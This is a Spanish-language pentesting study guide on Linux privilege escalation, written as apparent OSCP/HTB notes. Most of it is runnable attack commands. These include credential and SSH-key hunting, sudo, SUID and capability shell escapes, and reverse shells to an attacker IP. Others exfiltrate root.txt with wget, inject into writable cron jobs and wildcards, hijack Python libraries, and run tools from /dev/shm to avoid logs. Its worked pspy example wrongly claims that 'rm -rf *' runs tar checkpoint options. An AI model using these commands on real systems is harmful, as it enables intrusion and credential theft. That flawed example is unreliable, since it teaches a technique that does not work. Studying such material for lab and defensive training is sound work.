---
title: "Linux Pentesting - Gu√≠a Completa"
date: Sat Dec 07 2025 00:00:00 GMT+0100 (Central European Standard Time)
categories: [Apuntes, Linux]
tags: [linux, privilege-escalation, suid, capabilities, sudo, cron, ssh, oscp, apuntes, pentesting]
image: /assets/img/cabeceras/2025-12-07-linux-pentesting.png
---

# Linux Pentesting - Gu√≠a Completa

## üîç Enumeraci√≥n B√°sica

### Informaci√≥n del Sistema

```bash
# Informaci√≥n del kernel y versi√≥n
uname -a
cat /etc/os-release
cat /etc/issue
lsb_release -a

# Arquitectura del procesador
uname -m
arch

# Hostname
hostname
cat /etc/hostname

# Variables de entorno
env
printenv

# Historial de comandos
history
cat ~/.bash_history
cat ~/.zsh_history
```

### Usuario y Privilegios

```bash
# Usuario actual
whoami
id

# Grupos del usuario
groups
id -Gn

# Usuarios del sistema
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false" | cut -d':' -f1

# Usuarios con shell v√°lida
grep -vE "nologin|false" /etc/passwd

# √öltimos logins
last
lastlog

# Usuarios conectados actualmente
w
who
```

### Sudo y Permisos

```bash
# Comandos que podemos ejecutar como sudo
sudo -l

# Versi√≥n de sudo (buscar exploits)
sudo -V | head -1
sudo --version

# Archivo de configuraci√≥n sudoers
cat /etc/sudoers
cat /etc/sudoers.d/*
```

**üí° Tip**: Algunos sistemas permiten `sudo -l` sin contrase√±a, revelando informaci√≥n valiosa.

### Informaci√≥n de Red

```bash
# Interfaces y direcciones IP
ip a
ifconfig
hostname -I

# Tabla de enrutamiento
ip route
route -n
netstat -rn

# Conexiones activas
netstat -antup
ss -antup

# Puertos en escucha
netstat -tlnp
ss -tlnp
lsof -i

# Firewall rules
iptables -L -n
iptables -S
```

### Procesos y Servicios

```bash
# Procesos en ejecuci√≥n
ps aux
ps -ef
ps -eo pid,user,cmd

# √Årbol de procesos
pstree -p

# Servicios habilitados
systemctl list-units --type=service --state=running
systemctl list-unit-files | grep enabled

# Puertos y procesos
lsof -i:80
fuser 80/tcp
```

### Software Instalado

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RedHat/CentOS
rpm -qa
yum list installed

# Versiones espec√≠ficas
apache2 -v
nginx -v
mysql --version
python --version
python3 --version
```

---

## üìÇ B√∫squeda de Archivos y Credenciales

### Archivos Interesantes

```bash
# Archivos de configuraci√≥n comunes
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/resolv.conf
/etc/network/interfaces
/etc/crontab
/var/spool/cron/crontabs/*

# Logs
/var/log/auth.log
/var/log/syslog
/var/log/messages
/var/log/apache2/access.log
/var/log/nginx/access.log

# Archivos de usuario
~/.ssh/id_rsa
~/.ssh/authorized_keys
~/.bash_history
~/.mysql_history
~/.viminfo
```

### Buscar Credenciales en Archivos

```bash
# Buscar patrones de contrase√±as
grep -rinE '(password|passwd|pwd|pass|key|token|secret|admin|login|credentials)' /etc/ 2>/dev/null

# En directorio actual recursivamente
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)' .

# Buscar archivos de configuraci√≥n
find / -name "*.conf" -type f 2>/dev/null
find / -name "config*" -type f 2>/dev/null
find / -name "*config*" -type f 2>/dev/null

# Buscar archivos de backup
find / -name "*.bak" -type f 2>/dev/null
find / -name "*.backup" -type f 2>/dev/null
find / -name "*~" -type f 2>/dev/null

# Archivos de base de datos
find / -name "*.db" -type f 2>/dev/null
find / -name "*.sqlite" -type f 2>/dev/null
find / -name "*.sql" -type f 2>/dev/null

# Scripts
find / -name "*.sh" -type f 2>/dev/null
find / -name "*.py" -type f 2>/dev/null
find / -name "*.pl" -type f 2>/dev/null
```

### Buscar por Tama√±o (Flags HTB/PG)

```bash
# Buscar archivos de 34 bytes (HTB)
find / -type f -size 34c 2>/dev/null

# Buscar archivos de 38 bytes (PG)
find / -type f -size 38c 2>/dev/null

# Buscar y mostrar contenido
find / -type f -size 38c -exec sh -c 'echo {}; cat {}' \; 2>/dev/null

# Rango de tama√±o
find / -type f -size +36c -size -39c 2>/dev/null
```

### Claves SSH

```bash
# Buscar todas las claves privadas SSH
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# Authorized keys
find / -name "authorized_keys" 2>/dev/null

# Known hosts
find / -name "known_hosts" 2>/dev/null
```

**üí° Uso de claves SSH encontradas**:
```bash
# Si la clave tiene permisos incorrectos
chmod 600 id_rsa

# Conectar con la clave
ssh -i id_rsa user@target

# Si la clave est√° protegida con contrase√±a, crackear con John
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

## üîí SUID y GUID

### ¬øQu√© es SUID/GUID?

**SUID (Set User ID)**: Cuando un archivo con SUID se ejecuta, se ejecuta con los permisos del propietario del archivo (generalmente root).

**GUID (Set Group ID)**: Similar a SUID pero con los permisos del grupo.

### Buscar Binarios SUID/GUID

```bash
# Buscar archivos SUID
find / -type f -perm -4000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Buscar archivos GUID
find / -type f -perm -2000 -ls 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Buscar ambos (SUID o GUID)
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# Solo binarios en directorios no est√°ndar (m√°s sospechosos)
find / -type f -perm -4000 2>/dev/null | grep -v "/usr/bin\|/bin\|/usr/sbin\|/sbin"
```

### Binarios SUID Comunes Explotables

Referencia: [GTFOBins](https://gtfobins.github.io/)

#### find

```bash
# Si find tiene SUID
find . -exec /bin/bash -p \; -quit

# O con sh
find . -exec /bin/sh -p \; -quit
```

#### vim/vi

```bash
# Abrir vim con SUID
vim -c ':!/bin/bash'

# O desde dentro de vim
:set shell=/bin/bash
:shell
```

#### nano

```bash
# Desde nano con SUID
nano
^R^X
reset; bash 1>&0 2>&0
```

#### nmap (versiones antiguas)

```bash
# Nmap con SUID (versiones <5.21)
nmap --interactive
nmap> !bash -p
```

#### less/more

```bash
# Leer archivos como root
less /etc/shadow

# Ejecutar shell desde less
!/bin/bash
```

#### wget con SUID

```bash
# En m√°quina local, listener
nc -nlvp 80

# En target con wget SUID
sudo wget --post-file /root/root.txt http://10.10.14.87/

# Alternativa: Sobreescribir archivos
wget http://10.10.14.87/malicious -O /etc/passwd
```

#### cp con SUID

```bash
# Copiar /etc/shadow a ubicaci√≥n legible
cp /etc/shadow /tmp/shadow

# O sobreescribir /etc/passwd con versi√≥n maliciosa
```

#### bash/sh con SUID

```bash
# Mantener privilegios
bash -p
sh -p

# Verificar
whoami
id
```

**‚ö†Ô∏è Nota**: `-p` en bash mantiene el effective UID (no lo baja a real UID).

---

## üîì Sudo Exploitation

### Sudo -l Output Analysis

```bash
$ sudo -l
User alice may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/find
```

**Interpretaci√≥n**:
- `(ALL)`: Puede ejecutar como cualquier usuario
- `NOPASSWD`: No requiere contrase√±a
- `/usr/bin/find`: El binario espec√≠fico

### Explotar Binarios con Sudo

Siempre consultar: [GTFOBins - Sudo](https://gtfobins.github.io/)

#### find

```bash
sudo find . -exec /bin/bash \; -quit
```

#### vim

```bash
sudo vim -c ':!/bin/bash'
```

#### python

```bash
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

#### perl

```bash
sudo perl -e 'exec "/bin/bash";'
```

#### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

#### man

```bash
sudo man man
!/bin/bash
```

#### git

```bash
sudo git -p help
!/bin/bash
```

#### tar

```bash
# Crear checkpoint que ejecuta comando
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

#### zip

```bash
# Crear zip que ejecuta comando
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```

### Vulnerabilidades de Sudo

#### CVE-2019-14287 (Sudo < 1.8.28)

**Bypass de restricci√≥n de usuario**:

```bash
# Si sudoers tiene: (ALL, !root) /bin/bash
# Podemos ejecutar como root usando UID -1
sudo -u#-1 /bin/bash
```

#### CVE-2021-3156 (Baron Samedit)

**Heap-based buffer overflow** en sudo (versiones 1.8.2-1.8.31p2, 1.9.0-1.9.5p1).

```bash
# Exploit p√∫blico disponible
# https://github.com/blasty/CVE-2021-3156

# Verificar vulnerabilidad
sudoedit -s /
```

---

## ‚ö° Capabilities

### ¬øQu√© son las Capabilities?

Linux capabilities dividen los privilegios de root en unidades m√°s peque√±as. Un binario puede tener capabilities espec√≠ficas sin necesitar SUID root completo.

### Listar Capabilities

```bash
# Ver capabilities de todos los archivos
getcap -r / 2>/dev/null

# Ver capabilities de un archivo espec√≠fico
getcap /usr/bin/python3.8

# Ejemplo de salida:
# /usr/bin/python3.8 = cap_setuid+ep
```

### Capabilities Peligrosas

| Capability | Descripci√≥n | Riesgo |
|------------|-------------|--------|
| `cap_setuid` | Cambiar UID de proceso | Permite obtener root |
| `cap_dac_override` | Bypass permisos de archivos | Leer/escribir cualquier archivo |
| `cap_dac_read_search` | Bypass permisos de lectura | Leer cualquier archivo |
| `cap_sys_admin` | M√∫ltiples operaciones admin | Montar filesystems, etc |
| `cap_sys_ptrace` | Debuggear procesos | Inyectar c√≥digo en procesos |

### Explotar Capabilities

#### cap_setuid en Python

```bash
# Si python tiene cap_setuid+ep
getcap /usr/bin/python3.8
# /usr/bin/python3.8 = cap_setuid+ep

# Obtener shell root
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### cap_setuid en Perl

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### cap_dac_read_search

```bash
# Permite leer cualquier archivo (incluso /etc/shadow)
./binary_with_cap /etc/shadow
```

---

## ‚è∞ Cron Jobs

### Enumeraci√≥n de Cron Jobs

```bash
# Crontab del sistema
cat /etc/crontab

# Cron jobs de usuarios
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*

# Cron.d
ls -la /etc/cron.d/
cat /etc/cron.d/*

# Scripts programados
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Ver logs de cron
grep CRON /var/log/syslog
```

### Formato de Crontab

```
# ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ minuto (0 - 59)
# ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ hora (0 - 23)
# ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ d√≠a del mes (1 - 31)
# ‚îÇ ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ mes (1 - 12)
# ‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ d√≠a de la semana (0 - 6) (Domingo=0)
# ‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îÇ
# * * * * * comando a ejecutar
```

### Explotar Cron Jobs

#### Script con permisos de escritura

```bash
# Si encontramos cron job ejecut√°ndose como root
*/5 * * * * root /opt/backup.sh

# Y tenemos permisos de escritura en /opt/backup.sh
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root 123 Jan 10 12:00 /opt/backup.sh

# Inyectar reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.87/443 0>&1' >> /opt/backup.sh

# Esperar a que se ejecute el cron
```

#### PATH Hijacking en Cron

```bash
# Si crontab usa rutas relativas
*/5 * * * * root backup.sh

# Y tenemos control sobre PATH o podemos escribir en /tmp
echo '#!/bin/bash' > /tmp/backup.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /tmp/backup.sh
chmod +x /tmp/backup.sh

# Modificar crontab para usar nuestro PATH (si es posible)
# O esperar si /tmp est√° en PATH del cron
```

#### Monitorear Ejecuci√≥n de Procesos

```bash
# Usar pspy para ver procesos ejecut√°ndose (sin root)
# https://github.com/DominicBreuker/pspy

./pspy64 -pf -i 1000
```

---

## üåü Wildcard Exploitation

### ¬øQu√© es Wildcard Exploitation?

Cuando un script usa wildcards (`*`) en comandos como `tar`, `rsync`, `chown`, etc., podemos crear archivos que se interpreten como argumentos del comando.

### Ejemplo con tar

```bash
# Supongamos que existe un cron job:
*/5 * * * * cd /home/user/backup && tar czf backup.tar.gz *

# Creamos archivos maliciosos
cd /home/user/backup
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.87 443 >/tmp/f" > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Cuando tar se ejecute, interpretar√° nuestros archivos como argumentos:
# tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh <otros archivos>
```

### Ejemplo con chown

```bash
# Script vulnerable:
chown root:root /tmp/*

# Crear enlace simb√≥lico
ln -s /etc/passwd /tmp/passwd_link

# Cuando se ejecute, cambiar√° propietario de /etc/passwd
```

### Ejemplo con rsync

```bash
# Script vulnerable:
rsync -a /source/* /destination/

# Crear archivo con opciones maliciosas
touch "/source/--rsync-path=bash -c 'command'"
```

**Recursos**: [Wildcard Injection - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

---

## üîë SSH Techniques

### SSH Local Port Forwarding

```bash
# Mapear puerto remoto a local
# Puerto 5901 del target accesible en localhost:4444
ssh -L 4444:127.0.0.1:5901 user@10.10.10.50

# Conectar al servicio
vncviewer localhost:4444
```

### SSH Remote Port Forwarding

```bash
# Exponer puerto local en m√°quina remota
ssh -R 8080:localhost:80 user@10.10.10.50

# Ahora target puede acceder a nuestro puerto 80 via localhost:8080
```

### SSH Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Crear proxy SOCKS en puerto local
ssh -D 1080 user@10.10.10.50

# Usar con proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT 192.168.1.0/24
```

### SSH con Algoritmos Antiguos

```bash
# Si el servidor solo acepta algoritmos antiguos
ssh user@10.10.10.50 -o KexAlgorithms=+diffie-hellman-group1-sha1

# O a√±adir a ~/.ssh/config
Host 10.10.10.50
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
```

### SSH y Ejecutar Comando Directamente

```bash
# Conectar y ejecutar comando
ssh user@10.10.10.50 'whoami'

# Ejecutar reverse shell directamente
ssh user@10.10.10.50 -t '/bin/bash -i >& /dev/tcp/10.10.14.87/443 0>&1'
```

---

## üñ•Ô∏è Tmux Session Hijacking

### ¬øQu√© es Tmux Hijacking?

Si un usuario privilegiado (root) tiene una sesi√≥n tmux activa, podemos "apropiarnos" de ella si tenemos acceso al socket.

### Buscar Sesiones Tmux

```bash
# Listar procesos tmux
ps aux | grep tmux

# Buscar sockets de tmux
find / -name "*tmux*" 2>/dev/null
find /tmp -name "*tmux*" 2>/dev/null

# Ejemplo de socket:
# /tmp/tmux-0/default  (propiedad de root)
```

### Conectar a Sesi√≥n

```bash
# Si tenemos permisos de lectura/escritura en el socket
tmux -S /tmp/tmux-0/default attach

# O listar sesiones
tmux -S /tmp/tmux-0/default ls

# Si la sesi√≥n es de root, ahora tenemos shell root
```

**üí° Tip**: Buscar en directorios como `/dev/shm`, `/tmp`, `/var/run`.

---

## üêç Python Library Hijacking

### ¬øQu√© es Library Hijacking?

Si un script Python se ejecuta con privilegios elevados e importa librer√≠as desde rutas donde tenemos permisos de escritura, podemos inyectar c√≥digo malicioso.

### Ver Rutas de Python

```bash
# Python 2
python2.7 -c 'import sys; print "\n".join(sys.path)'

# Python 3
python3 -c 'import sys; print("\n".join(sys.path))'

# Ejemplo de salida:
# /usr/lib/python3.8
# /usr/lib/python3.8/lib-dynload
# /usr/local/lib/python3.8/dist-packages
# /usr/lib/python3/dist-packages
```

### Explotar Library Hijacking

```bash
# Script vulnerable ejecut√°ndose como root:
#!/usr/bin/python3
import backup_module
backup_module.run()

# Si podemos escribir en una ruta de sys.path ANTES de la librer√≠a leg√≠tima
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' > /tmp/backup_module.py

# O en el mismo directorio del script (tiene prioridad)
cd /path/to/script
echo 'import os; os.system("chmod +s /bin/bash")' > backup_module.py

# Esperar a que se ejecute el script
/tmp/rootbash -p
```

**Recursos**: [Python Library Hijacking - Rastating](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

---

## üõ†Ô∏è Herramientas de Enumeraci√≥n Automatizada

### LinPEAS - Privilege Escalation Awesome Scripts

**LinPEAS** es LA herramienta de enumeraci√≥n m√°s completa para Linux. Automatiza la b√∫squeda de vectores de escalada de privilegios y destaca los hallazgos por colores seg√∫n su criticidad.

#### ¬øQu√© hace LinPEAS?

LinPEAS analiza el sistema en busca de:
- ‚úÖ Informaci√≥n del sistema (kernel, distribuci√≥n, arquitectura)
- ‚úÖ Usuarios, grupos y permisos
- ‚úÖ Procesos en ejecuci√≥n (como root, con capabilities, etc.)
- ‚úÖ Servicios y sockets de red
- ‚úÖ Cron jobs y timers systemd
- ‚úÖ Binarios SUID/GUID
- ‚úÖ Capabilities
- ‚úÖ Archivos con contrase√±as (config, history, logs)
- ‚úÖ Claves SSH privadas
- ‚úÖ Software instalado y versiones
- ‚úÖ Variables de entorno
- ‚úÖ Configuraciones de sudo
- ‚úÖ Exploits conocidos para el kernel
- ‚úÖ Contenedores (Docker, LXC, etc.)
- ‚úÖ Montajes NFS vulnerables
- ‚úÖ Y mucho m√°s...

**Repositorio oficial**: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

#### Instalaci√≥n y Ejecuci√≥n

```bash
# M√©todo 1: Ejecutar directamente desde internet (requiere conexi√≥n)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# M√©todo 2: Descargar y ejecutar (recomendado)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# M√©todo 3: Transferir desde Kali
# En Kali:
locate linpeas.sh  # Usualmente en /usr/share/peass/linpeas/linpeas.sh
python3 -m http.server 8000

# En target:
wget http://10.10.14.50:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# M√©todo 4: Usando curl y guardar
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
```

#### Opciones de Ejecuci√≥n

```bash
# Ejecuci√≥n b√°sica (recomendada)
./linpeas.sh

# Guardar output en archivo
./linpeas.sh | tee linpeas_output.txt

# Sin colores (mejor para logs)
./linpeas.sh -a 2>&1 | tee linpeas.txt

# Ejecuci√≥n silenciosa (solo hallazgos importantes)
./linpeas.sh -q

# Ejecuci√≥n super silenciosa (solo lo m√°s cr√≠tico)
./linpeas.sh -q -q

# Con password para buscar en archivos
./linpeas.sh -p

# Modo thorough (m√°s lento pero m√°s completo)
./linpeas.sh -a

# Solo buscar passwords
./linpeas.sh -s

# Especificar nivel de detalle (0-3)
./linpeas.sh -l 2
```

#### Interpretaci√≥n de Colores

LinPEAS usa colores para indicar criticidad:

| Color | Significado | Acci√≥n |
|-------|-------------|--------|
| üî¥ **ROJO/ROSA** | 95%+ probabilidad de privesc | Explotar inmediatamente |
| üü° **AMARILLO** | Potencial vector de privesc | Investigar a fondo |
| üîµ **AZUL** | Informaci√≥n interesante | Revisar si es √∫til |
| üü¢ **VERDE** | Informaci√≥n general | Contexto del sistema |

#### Secciones Clave de LinPEAS

**1. Kernel Exploits**
```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executing Linux Exploit Suggester
‚ïö https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit
    Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
    Exposure: probable
    Tags: ubuntu=20.04
```
**Acci√≥n**: Si aparece en rojo/amarillo, buscar exploit y compilar.

**2. Sudo Version Check**
```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Checking 'sudo' version
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2
```
**Acci√≥n**: Versiones < 1.8.28 vulnerables a CVE-2019-14287.

**3. SUID Binaries**
```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 137K Sep  5  2019 /usr/bin/base64  --->  GTFOBins
```
**Acci√≥n**: Si dice "GTFOBins" en rojo, ir a gtfobins.github.io y explotar.

**4. Capabilities**
```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Capabilities
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
/usr/bin/python3.8 = cap_setuid+ep
```
**Acci√≥n**: cap_setuid permite setuid(0) para obtener root.

**5. Writable Cron Directories**
```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Cron jobs
‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
-rw-rw-rw- 1 root root 1.1K Oct 23 12:00 /etc/cron.d/backup
```
**Acci√≥n**: Si es writable, modificar para ejecutar c√≥digo como root.

#### Workflow Recomendado con LinPEAS

```bash
# Paso 1: Ejecutar LinPEAS y guardar output
./linpeas.sh -a 2>&1 | tee linpeas_full.txt

# Paso 2: Buscar las l√≠neas m√°s cr√≠ticas (rojas/amarillas)
cat linpeas_full.txt | grep -i "95\|99"  # Porcentajes altos de privesc

# Paso 3: Priorizar vectores
# 1¬∫ - Kernel exploits (si hay)
# 2¬∫ - Sudo misconfigurations
# 3¬∫ - SUID/Capabilities
# 4¬∫ - Writable files/cron
# 5¬∫ - Passwords en archivos

# Paso 4: Explotar el vector m√°s prometedor
```

#### Tips y Trucos

**1. Ejecutar en memoria (sin escribir en disco)**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**2. Transferir via base64 (si no hay wget/curl)**
```bash
# En Kali:
base64 -w0 linpeas.sh > linpeas_b64.txt

# En target:
echo "BASE64_STRING" | base64 -d > linpeas.sh
chmod +x linpeas.sh
```

**3. Ejecutar desde memoria compartida (evitar logs)**
```bash
cp linpeas.sh /dev/shm/
/dev/shm/linpeas.sh
rm /dev/shm/linpeas.sh
```

**4. Buscar passwords espec√≠ficamente**
```bash
./linpeas.sh -p | grep -i "password\|passwd\|pwd"
```

**5. Exportar solo hallazgos cr√≠ticos**
```bash
./linpeas.sh 2>&1 | grep -E "\[0;31m|\[0;95m" > critical_findings.txt
```

#### Limitaciones de LinPEAS

- ‚ùå **No explota autom√°ticamente**: Solo enumera, t√∫ debes explotar
- ‚ùå **Puede ser detectado**: Antivirus pueden flaggearlo
- ‚ùå **Ruidoso**: Hace muchas operaciones (detectable en logs)
- ‚ùå **Falsos positivos**: A veces marca cosas que no son explotables

#### Alternativas a LinPEAS

Si LinPEAS es detectado, usa alternativas:

```bash
# LinEnum (m√°s viejo pero menos detectado)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
./LinEnum.sh -t

# Linux Smart Enumeration (LSE)
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
./lse.sh -l2

# Linux Exploit Suggester (solo exploits de kernel)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

### pspy - Unprivileged Linux Process Snooping

**pspy** es una herramienta que permite **monitorear procesos en tiempo real SIN necesitar privilegios de root**. Es extremadamente √∫til para descubrir cron jobs, scripts ejecut√°ndose, y comandos que otros usuarios ejecutan.

#### ¬øC√≥mo funciona pspy sin root?

**Magia de Linux**: pspy utiliza el pseudo-filesystem `/proc` y syscalls de Linux para detectar:
1. **Cambios en el FS** - Monitorea `/proc` para detectar nuevos PIDs
2. **Eventos inotify** - Detecta cambios en archivos
3. **Polling inteligente** - Revisa continuamente los procesos activos

**Repositorio oficial**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

#### ¬øPor qu√© usar pspy?

**Problema**: `ps aux` solo muestra procesos en ese instante. Un cron job que se ejecuta cada minuto puede no aparecer.

**Soluci√≥n**: pspy monitorea TODOS los procesos que se crean, incluso los que duran milisegundos.

**Casos de uso**:
- ‚úÖ Descubrir cron jobs ocultos
- ‚úÖ Ver scripts ejecutados por root
- ‚úÖ Encontrar comandos con rutas relativas (PATH hijacking)
- ‚úÖ Detectar cleanup scripts
- ‚úÖ Ver argumentos de comandos ejecutados

#### Instalaci√≥n

```bash
# Descargar pspy64 (sistema 64-bit)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# O pspy32 (sistema 32-bit)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32

# Dar permisos
chmod +x pspy64

# Transferir desde Kali
# En Kali:
locate pspy64
python3 -m http.server 8000

# En target:
wget http://10.10.14.50:8000/pspy64
chmod +x pspy64
```

#### Uso B√°sico

```bash
# Ejecuci√≥n b√°sica (usar valores por defecto)
./pspy64

# Con opciones recomendadas
./pspy64 -pf -i 1000

# Opciones explicadas:
# -p : Mostrar comandos y argumentos
# -f : Mostrar eventos de filesystem (FS events)
# -i 1000 : Intervalo de escaneo en ms (1000ms = 1 segundo)
```

#### Opciones Avanzadas

```bash
# Solo procesos (sin FS events)
./pspy64 -p

# Solo FS events (sin procesos)
./pspy64 -f

# Con directorio espec√≠fico para monitorear
./pspy64 -pf -d /tmp -d /opt

# Escaneo muy r√°pido (100ms - m√°s CPU)
./pspy64 -pf -i 100

# Escaneo lento (5 segundos - menos detectable)
./pspy64 -pf -i 5000

# Modo silencioso (solo nuevos procesos)
./pspy64 -p --ppid
```

#### Interpretaci√≥n del Output

**Ejemplo de output**:
```
2023/12/13 20:30:01 CMD: UID=0    PID=12345  | /bin/bash /opt/scripts/backup.sh
2023/12/13 20:30:01 CMD: UID=0    PID=12346  | tar czf /backup/data.tar.gz /var/www/html
2023/12/13 20:30:02 FS:                       OPEN | /opt/scripts/backup.sh
```

**Interpretaci√≥n**:
- `UID=0` ‚Üí Ejecutado por **root**
- `PID=12345` ‚Üí Process ID
- `/bin/bash /opt/scripts/backup.sh` ‚Üí Comando completo con argumentos
- `FS: OPEN` ‚Üí El archivo fue abierto

**Qu√© buscar**:

1. **Comandos ejecutados como root (UID=0)**
```
CMD: UID=0 PID=1234 | /usr/bin/python3 /opt/monitor.py
```
‚Üí Revisar `/opt/monitor.py` para permisos de escritura o library hijacking.

2. **Rutas relativas**
```
CMD: UID=0 PID=1234 | backup.sh
```
‚Üí PATH Hijacking! El script no usa ruta absoluta.

3. **Wildcards en comandos**
```
CMD: UID=0 PID=1234 | tar czf backup.tar.gz *
```
‚Üí Wildcard injection posible.

4. **Archivos siendo modificados**
```
FS: MODIFY | /etc/passwd
```
‚Üí Alg√∫n proceso est√° modificando /etc/passwd (podemos race condition).

#### Workflow con pspy

```bash
# Paso 1: Ejecutar pspy en background
./pspy64 -pf -i 1000 > pspy_output.txt &

# Paso 2: Esperar 5-10 minutos (capturar cron jobs)
sleep 600

# Paso 3: Matar proceso pspy
killall pspy64

# Paso 4: Analizar output
# Buscar comandos ejecutados como root (UID=0)
grep "UID=0" pspy_output.txt

# Buscar rutas relativas (sin / al inicio)
grep "CMD:" pspy_output.txt | grep -v "^/"

# Buscar wildcards
grep "CMD:" pspy_output.txt | grep "\*"

# Buscar comandos con argumentos sospechosos
grep "CMD:" pspy_output.txt | grep -E "(wget|curl|python|bash|sh)"
```

#### Ejemplo Real de Escalada

**Scenario**: pspy detecta esto cada minuto:
```
CMD: UID=0 PID=1234 | /bin/bash /opt/scripts/cleanup.sh
```

**Paso 1**: Revisar permisos
```bash
ls -la /opt/scripts/cleanup.sh
# -rwxr-xr-x 1 root root 123 Jan 10 12:00 /opt/scripts/cleanup.sh
```
‚Üí No writable üòû

**Paso 2**: Leer contenido
```bash
cat /opt/scripts/cleanup.sh
```
```bash
#!/bin/bash
cd /tmp
rm -rf *
```

**Paso 3**: Explotar wildcard
```bash
cd /tmp
echo 'chmod +s /bin/bash' > exploit.sh
chmod +x exploit.sh
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh exploit.sh'

# Esperar a que se ejecute rm -rf *
# rm interpretar√° nuestros archivos como argumentos
```

**Paso 4**: Obtener root
```bash
/bin/bash -p
whoami  # root
```

#### Tips y Trucos

**1. Ejecutar en memoria compartida**
```bash
cp pspy64 /dev/shm/
/dev/shm/pspy64 -pf -i 1000
rm /dev/shm/pspy64
```

